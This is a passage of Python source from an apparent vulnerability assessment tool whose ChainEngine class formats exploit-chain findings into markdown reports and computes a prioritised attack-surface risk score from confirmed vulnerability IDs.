        """Render a single ExploitChain as a markdown report section."""
        lines = [
            f"### Chain #{index}: {chain.title}",
            "",
            "| Attribute    | Value |",
            "|---|---|",
            f"| Severity     | **{chain.severity}** |",
            f"| CVSS (est.)  | {chain.cvss_estimate:.1f} |",
            f"| Confidence   | {int(chain.confidence * 100)}% |",
            f"| Tags         | {', '.join(chain.tags)} |",
            "",
            f"**Impact:** {chain.impact}",
            "",
            f"**Prerequisites:** {', '.join(chain.prerequisites)}",
            "",
            "**Exploit Steps:**",
        ]
        for step in chain.steps:
            lines.append(f"  {step.order}. [{step.mitre_tactic}] **{step.action}**")
            lines.append(f"     Tool: `{step.tool}`" + (f" — {step.notes}" if step.notes else ""))
        lines += ["", "**Recommendations:**"]
        for rec in chain.recommendations:
            lines.append(f"  - {rec}")
        return "\n".join(lines)

    def format_all(self, chains: List[ExploitChain]) -> str:
        """Render all chains as a full markdown section."""
        if not chains:
            return "No applicable exploit chains found for the provided vulnerability set."
        lines = [
            "═" * 62,
            f"  EXPLOIT CHAIN ANALYSIS — {len(chains)} chain(s) identified",
            "═" * 62,
            "",
        ]
        for i, c in enumerate(chains, 1):
            lines.append(self.format_chain(c, i))
            lines.append("")
        return "\n".join(lines)

    def list_all_chain_templates(self) -> str:
        """Return a catalogue of all known chain templates."""
        lines = [
            "## Known Exploit Chain Templates",
            "",
            "| # | ID | Title | Severity | Triggers |",
            "|---|---|---|---|---|",
        ]
        for i, rule in enumerate(_CHAIN_RULES, 1):
            triggers_str = ", ".join(rule["triggers"])
            lines.append(f"| {i} | `{rule['id']}` | {rule['title']} | {rule['severity']} | {triggers_str} |")
        lines += ["", f"Total: {len(_CHAIN_RULES)} chains defined."]
        return "\n".join(lines)

    def score_attack_surface(self, confirmed_vuln_ids: List[str]) -> str:
        """
        Score the overall attack surface risk given a list of confirmed vuln IDs.
        Returns a prioritised risk summary with chain-awareness.
        """
        chains = self.compute_chains(confirmed_vuln_ids)

        critical_chains = [c for c in chains if c.severity == "CRITICAL"]
        high_chains     = [c for c in chains if c.severity == "HIGH"]
        medium_chains   = [c for c in chains if c.severity == "MEDIUM"]

        # CVSS-weighted risk score
        total_score = sum(c.cvss_estimate * c.confidence for c in chains)
        max_score   = 10.0

        # Risk rating
        if critical_chains:
            risk_label = "CRITICAL"
        elif len(high_chains) >= 2:
            risk_label = "HIGH"
        elif high_chains:
            risk_label = "MEDIUM-HIGH"
        elif medium_chains:
            risk_label = "MEDIUM"
        else:
            risk_label = "LOW"

        lines = [
            "## Attack Surface Risk Score",
            "",
            f"**Overall Risk:**      {risk_label}",
            f"**Chained CVSS Score:** {min(total_score, max_score):.1f} / 10.0",
            f"**Confirmed Vulns:**   {len(confirmed_vuln_ids)}",
            f"**Applicable Chains:** {len(chains)} total "
            f"({len(critical_chains)} CRITICAL, {len(high_chains)} HIGH, {len(medium_chains)} MEDIUM)",
            "",
            "### Priority Chains (act on these first):",
        ]
        for i, c in enumerate(chains[:5], 1):
            lines.append(f"  {i}. [{c.severity}] **{c.title}** — CVSS {c.cvss_estimate:.1f}, Confidence {int(c.confidence*100)}%")
        if not chains:
            lines.append("  (none — individual vulns may still be impactful)")
        return "\n".join(lines)


# Shared engine instance
_chain_engine = ChainEngine()


def get_chain_engine() -> ChainEngine:
    """Get the shared ChainEngine instance."""
    return _chain_engine
